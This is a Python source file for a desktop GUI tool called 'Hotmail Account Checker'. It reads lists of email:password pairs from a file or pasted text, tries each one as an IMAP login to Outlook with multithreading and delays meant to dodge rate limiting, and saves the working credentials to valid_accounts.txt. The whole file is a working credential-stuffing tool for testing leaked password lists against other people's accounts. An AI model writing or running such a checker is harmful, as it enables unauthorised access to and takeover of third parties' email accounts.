import imaplib
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import threading
import time

# Set max number of threads to avoid overloading
MAX_THREADS = 10

def check_hotmail_login(email, password, valid_accounts, failed_accounts, progress_callback):
    """Attempts to log into a Hotmail account using IMAP."""
    try:
        mail = imaplib.IMAP4_SSL('outlook.office365.com', timeout=10)  # 10s timeout
        mail.login(email, password)
        mail.logout()
        valid_accounts.append(f'{email}:{password}')
    except Exception:
        failed_accounts.append(f'{email}:{password}')
    finally:
        progress_callback()  # Update progress bar

def upload_file():
    """Opens a file dialog to select a file with credentials."""
    file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    if not file_path:
        messagebox.showwarning("No File Selected", "Please select a file to proceed.")
        return
    threading.Thread(target=process_accounts, args=(file_path,)).start()

def process_accounts(file_path=None):
    """Processes accounts from a file or text box input using threading."""
    output_file = 'valid_accounts.txt'  
    failed_file = 'failed_accounts.txt'  
    
    accounts = []

    # Read from file if uploaded
    if file_path:
        with open(file_path, 'r') as f:
            accounts += [line.strip().split(':') for line in f.readlines()]

    # Read from the text box input
    pasted_data = text_box.get("1.0", tk.END).strip()
    if pasted_data:
        accounts += [line.strip().split(':') for line in pasted_data.split("\n")]

    if not accounts:
        messagebox.showerror("No Accounts Found", "Please upload a file or paste credentials.")
        return

    valid_accounts = []
    failed_accounts = []
    total = len(accounts)
    progress_label.config(text="Checking accounts...")
    
    # Progress tracking
    progress_var.set(0)
    progress_bar["maximum"] = total

    def update_progress():
        progress_var.set(progress_var.get() + 1)
        progress_label.config(text=f"Checked {progress_var.get()}/{total}")
        root.update_idletasks()

    # Create threads for faster execution
    threads = []
    for index, credentials in enumerate(accounts):
        if len(credentials) != 2:
            continue  # Skip invalid lines

        email, password = credentials
        
        while threading.active_count() > MAX_THREADS:
            time.sleep(0.1)  # Wait if too many threads are running

        thread = threading.Thread(target=check_hotmail_login, args=(email, password, valid_accounts, failed_accounts, update_progress))
        threads.append(thread)
        thread.start()
        time.sleep(0.5)  # Delay to avoid rate limiting

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    # Save results
    with open(output_file, 'w') as f:
        f.write('\n'.join(valid_accounts))
    with open(failed_file, 'w') as f:
        f.write('\n'.join(failed_accounts))

    progress_label.config(text=f"✅ Done! {len(valid_accounts)} valid, {len(failed_accounts)} failed.")
    messagebox.showinfo("Process Complete", "Account checking is done! Check valid_accounts.txt and failed_accounts.txt")

def create_gui():
    """Creates the main GUI for the application."""
    global root, progress_label, text_box, progress_var, progress_bar
    root = tk.Tk()
    root.title("Hotmail Account Checker")
    root.geometry("500x350")

    label = tk.Label(root, text="Upload a file or paste credentials below:", font=("Arial", 12))
    label.pack(pady=5)

    upload_button = tk.Button(root, text="Upload File", command=upload_file, font=("Arial", 10), bg="lightblue")
    upload_button.pack(pady=5)

    text_box = tk.Text(root, height=5, width=50)
    text_box.pack(pady=5)

    check_button = tk.Button(root, text="Check Accounts", command=lambda: threading.Thread(target=process_accounts).start(), font=("Arial", 10), bg="lightgreen")
    check_button.pack(pady=5)

    progress_var = tk.IntVar()
    progress_bar = ttk.Progressbar(root, length=400, variable=progress_var, mode="determinate")
    progress_bar.pack(pady=5)

    progress_label = tk.Label(root, text="", font=("Arial", 10))
    progress_label.pack(pady=10)

    root.mainloop()

# Start GUI
create_gui()
